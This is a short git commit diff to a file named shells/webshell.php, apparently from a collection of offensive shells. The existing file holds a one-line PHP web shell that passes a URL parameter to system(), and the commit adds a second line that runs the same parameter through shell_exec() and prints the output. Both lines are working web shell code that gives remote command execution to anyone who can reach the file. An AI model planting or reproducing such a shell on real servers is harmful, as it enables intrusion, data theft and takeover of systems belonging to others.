4f673709573c482047303a1c8b076232dc762a47
gabyorel <gabyorel@hotmail.fr>
2023-10-29 15:47:06 +0100

    add new method in webshell.php

--- shells/webshell.php
+++ shells/webshell.php
@@ -1,2 +1,5 @@
 // take input from the url parameter
 <?php system($_GET["cmd"]); ?>
+
+// ensure that the results are formatted correctly
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
